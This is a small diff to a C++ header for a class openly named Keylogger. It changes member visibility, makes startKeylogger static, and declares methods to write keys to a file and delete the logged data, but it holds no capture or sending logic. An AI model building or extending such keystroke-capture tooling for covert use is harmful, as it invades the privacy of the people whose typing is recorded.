@@ -14,7 +14,9 @@
 using namespace std;
 
 class Keylogger {
-private:
+
+public:
+
     const locale utf8_locale = locale(locale(), new codecvt_utf8<wchar_t>());
     wofstream file;
     HWND hWindowHandle;
@@ -22,13 +24,13 @@ private:
     DWORD threadId;
     HKL hkl;
 
-public:
 
     Keylogger();
 
     void writeKeyToFile(char key);
 
-    int startKeylogger();
+    static int startKeylogger();
+    //static int startKeylogger(Keylogger keylogger);
 
     //Delete all the data in the keylogger file
     bool deleteKeyloggerData();
